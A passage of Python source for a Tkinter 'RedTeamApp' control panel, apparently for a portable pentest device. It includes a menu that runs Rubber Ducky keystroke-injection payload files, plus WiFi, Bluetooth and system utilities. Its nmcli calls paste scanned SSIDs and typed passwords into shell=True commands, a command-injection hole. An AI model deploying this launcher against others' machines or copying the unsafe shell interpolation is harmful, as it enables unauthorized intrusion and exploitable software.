            except Exception as e: self.escribir_consola(f"[!] Error: {e}")
        threading.Thread(target=conectar, daemon=True).start()

    # ==========================================
    # MENÚ RUBBER DUCKY (lazy import de ducky_logic)
    # ==========================================
    def show_ducky_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="PAYLOADS DUCKY", style='Title.TLabel').pack(pady=2)
        payloads_dir = "payloads"
        os.makedirs(payloads_dir, exist_ok=True)
        archivos = [f for f in os.listdir(payloads_dir) if f.endswith(".txt")]
        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for archivo in archivos[:4]:  # máximo 4
            ruta = os.path.join(payloads_dir, archivo)
            ttk.Button(frame, text=archivo, style='Red.TButton',
                       command=lambda r=ruta: self._ejecutar_ducky(r)).pack(fill='x', pady=2)
        self.mostrar_consola()

    def _import_ducky_logic(self):
        if not hasattr(self, '_ducky_logic'):
            import ducky_logic
            self._ducky_logic = ducky_logic
        return self._ducky_logic

    def _ejecutar_ducky(self, ruta):
        ducky = self._import_ducky_logic()
        self.escribir_consola(f"\n[+] Exec: {os.path.basename(ruta)}")
        def run():
            time.sleep(2)
            try:
                ducky.ejecutar_script_ducky(ruta)
                self.escribir_consola("[+] Hecho.")
            except Exception as e:
                self.escribir_consola(f"[!] Error: {e}")
        threading.Thread(target=run, daemon=True).start()

    # ==========================================
    # MENÚ UTILIDADES 
    # ==========================================
    def show_utils_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="UTILIDADES", style='Title.TLabel').pack(pady=2)

        opciones = [
            ("Conectar a Red WiFi", self._utils_wifi_seleccionar_interfaz),
            ("Estado de Red WiFi", self._utils_wifi_estado),
            ("Conectar Dispositivo BT", self._utils_bluetooth_seleccionar_interfaz),
            ("Estado de Adaptador BT", self._utils_bluetooth_estado)
        ]
        for texto, cmd in opciones:
            ttk.Button(self.main_frame, text=texto, style='Red.TButton', command=cmd,
                       width=28).pack(fill='x', padx=10, pady=2)

        ttk.Label(self.main_frame, text="SISTEMA", style='Title.TLabel').pack(pady=(4,2))
        btn_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        btn_frame.pack(fill='x', padx=5, pady=2)
        comandos_sys = [
            ("Almacenamiento", "df -h"),
            ("Memoria RAM", "free -h"),
            ("Top CPU", "ps aux --sort=-%cpu | head -6"),
            ("Conexiones", "ss -tulnp | head -10")
        ]
        for nombre, cmd in comandos_sys:
            ttk.Button(btn_frame, text=nombre, style='Gray.TButton',
                       command=lambda c=cmd: self.ejecutar_comando(c, use_shell=True)).pack(fill='x', pady=1)

        sys_opts = ttk.Frame(self.main_frame, style='Dark.TFrame')
        sys_opts.pack(fill='x', padx=5, pady=5)
        sys_opts.grid_columnconfigure((0,1), weight=1)
        ttk.Button(sys_opts, text="REINICIAR", style='Danger.TButton',
                   command=lambda: subprocess.run("reboot", shell=True)).grid(row=0, column=0, padx=2, sticky="ew")
        ttk.Button(sys_opts, text="APAGAR", style='Danger.TButton',
                   command=lambda: subprocess.run("shutdown -h now", shell=True)).grid(row=0, column=1, padx=2, sticky="ew")
        self.mostrar_consola()

    # -------------------- UTILIDADES WiFi --------------------
    def obtener_interfaces_wifi(self):
        interfaces = []
        try:
            output = subprocess.check_output("iw dev | grep Interface", shell=True, text=True)
            for line in output.splitlines():
                interfaces.append(line.split()[-1])
        except: pass
        return interfaces if interfaces else []

    def _utils_wifi_seleccionar_interfaz(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="IFACE WIFI", style='Title.TLabel').pack(pady=2)
        for iface in self.obtener_interfaces_wifi():
            ttk.Button(self.main_frame, text=iface, style='Red.TButton',
                       command=lambda i=iface: self._utils_wifi_escanear_redes(i)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _utils_wifi_escanear_redes(self, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="ESCANEANDO...", style='Title.TLabel').pack(pady=2)
        self.mostrar_consola()
        def escanear():
            subprocess.run(f"nmcli device wifi rescan ifname {iface}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            try:
                output = subprocess.check_output(f"nmcli -t -f SSID,SECURITY,SIGNAL device wifi list ifname {iface}", shell=True, text=True, stderr=subprocess.DEVNULL)
                redes = []
                for line in output.strip().split('\n'):
                    if not line.strip(): continue
                    parts = line.split(':')
                    if len(parts) >= 3: redes.append({"ssid": parts[0] or "<Oculta>", "security": parts[1] or "Ninguna", "signal": parts[2]})
                self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, redes))
            except: self.after(0, lambda: self._utils_wifi_mostrar_redes(iface, []))
        threading.Thread(target=escanear, daemon=True).start()

    def _utils_wifi_mostrar_redes(self, iface, redes, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="REDES", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No disponibles.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(redes) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(redes))
        page_redes = redes[start:end]
        self._utils_wifi_redes = redes
        self._utils_wifi_iface = iface
        self._utils_wifi_page = page

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for red in page_redes:
            texto = f"{red['ssid']} | {red['signal']}%"
            ttk.Button(frame, text=texto, style='Gray.TButton',
                       command=lambda r=red: self._utils_wifi_conectar(iface, r['ssid'], r['security'])).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._utils_wifi_mostrar_redes(iface, redes, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._utils_wifi_mostrar_redes(iface, redes, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _utils_wifi_conectar(self, iface, ssid, security):
        if security and security.lower() != "none" and "wep" not in security.lower():
            password = simpledialog.askstring("WiFi", f"Password para '{ssid}':")
            if not password: return
        else:
            password = None

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._utils_wifi_escanear_redes(iface))
        ttk.Label(self.main_frame, text=f"CONECTANDO...", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()

        def conectar():
            try:
                cmd = f"nmcli device wifi connect '{ssid}' password '{password}' ifname {iface}" if password else f"nmcli device wifi connect '{ssid}' ifname {iface}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    state_out = subprocess.check_output(f"nmcli -t -f GENERAL.STATE dev show {iface}", shell=True, text=True)
                    estado = "ÉXITO" if "100 (connected)" in state_out else "ADVERTENCIA"
                else:
                    estado = f"ERROR: {result.stderr.strip()}"
            except Exception as e:
                estado = f"EXCEPCIÓN: {e}"
            self.after(0, lambda: self._utils_wifi_mostrar_resultado(estado, iface))
        threading.Thread(target=conectar, daemon=True).start()

    def _utils_wifi_mostrar_resultado(self, mensaje, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_wifi_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="RESULTADO", style='Title.TLabel').pack(pady=5)
        ttk.Label(self.main_frame, text=mensaje, wraplength=300).pack(pady=5)
        self.mostrar_consola()

    def _utils_wifi_estado(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="ESTADO WIFI", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()
        for iface in self.obtener_interfaces_wifi():
            self.ejecutar_comando(f"nmcli -t -f GENERAL.STATE,IP4.ADDRESS dev show {iface} | head -2")

    # -------------------- UTILIDADES BLUETOOTH --------------------
    def obtener_interfaces_bluetooth(self):
        interfaces = []
        try:
            output = subprocess.check_output("hciconfig -a | grep 'hci'", shell=True, text=True)
            for line in output.splitlines():
                if "hci" in line:
                    interfaces.append(line.split(':')[0].strip())
        except: pass
        return interfaces if interfaces else []

    def _utils_bluetooth_seleccionar_interfaz(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="ADAPTADOR BT", style='Title.TLabel').pack(pady=5)
        for iface in self.obtener_interfaces_bluetooth():
            ttk.Button(self.main_frame, text=iface, style='Red.TButton',
                       command=lambda i=iface: self._utils_bluetooth_escanear(i)).pack(fill='x', padx=10, pady=3)
        self.mostrar_consola()

    def _utils_bluetooth_escanear(self, iface):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="ESCANEANDO BT...", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()

        def escanear():
            subprocess.run(["sudo", "hciconfig", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            for cmd_text in ["select", "power on", "discoverable on", "pairable on"]:
                subprocess.run(f"sudo bluetoothctl -- {cmd_text}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("sudo bluetoothctl -- scan on &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(12)
            subprocess.run(["sudo", "bluetoothctl", "--", "scan", "off"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            dispositivos = []
            try:
                output = subprocess.check_output("sudo bluetoothctl -- devices", shell=True, text=True)
                for line in output.splitlines():
                    if "Device" in line:
                        parts = line.strip().split(' ', 2)
                        if len(parts) >= 3:
                            dispositivos.append({"mac": parts[1], "nombre": parts[2]})
            except: pass
            self.after(0, lambda: self._utils_bluetooth_mostrar_dispositivos(iface, dispositivos))
        threading.Thread(target=escanear, daemon=True).start()

    def _utils_bluetooth_mostrar_dispositivos(self, iface, dispositivos, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="DISPOSITIVOS", style='Title.TLabel').pack(pady=2)
        if not dispositivos:
            ttk.Label(self.main_frame, text="No encontrados.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(dispositivos) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(dispositivos))
        page_devs = dispositivos[start:end]
        self._utils_bt_devices = dispositivos
        self._utils_bt_page = page
        self._utils_bt_iface = iface

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for dev in page_devs:
            texto = f"{dev['nombre'][:15]} ({dev['mac']})"
            ttk.Button(frame, text=texto, style='Gray.TButton',
                       command=lambda d=dev: self._utils_bluetooth_conectar(iface, d['mac'], d['nombre'])).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._utils_bluetooth_mostrar_dispositivos(iface, dispositivos, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._utils_bluetooth_mostrar_dispositivos(iface, dispositivos, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _utils_bluetooth_conectar(self, iface, mac, nombre):
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._utils_bluetooth_escanear(iface))
        ttk.Label(self.main_frame, text="CONECTANDO...", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()

        def conectar():
            try:
                pair = subprocess.run(f"sudo bluetoothctl -- pair {mac}", shell=True, capture_output=True, text=True, timeout=30)
                if "Pairing successful" in pair.stdout or "Paired: yes" in pair.stdout:
                    connect = subprocess.run(f"sudo bluetoothctl -- connect {mac}", shell=True, capture_output=True, text=True, timeout=30)
                    estado = "ÉXITO" if "Connection successful" in connect.stdout or "Connected: yes" in connect.stdout else "ERROR"
                else:
                    estado = "FALLO PAIR"
            except Exception as e:
                estado = f"EXCEPCIÓN: {e}"
            self.after(0, lambda: self._utils_bt_mostrar_resultado(estado))
        threading.Thread(target=conectar, daemon=True).start()

    def _utils_bt_mostrar_resultado(self, mensaje):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="RESULTADO", style='Title.TLabel').pack(pady=5)
        ttk.Label(self.main_frame, text=mensaje, wraplength=300).pack(pady=5)
        self.mostrar_consola()

    def _utils_bluetooth_estado(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="ESTADO BT", style='Title.TLabel').pack(pady=5)
        self.mostrar_consola()
        for iface in self.obtener_interfaces_bluetooth():
            self.ejecutar_comando(f"hciconfig {iface} -a")

if __name__ == "__main__":
    app = RedTeamApp()
    app.mainloop()
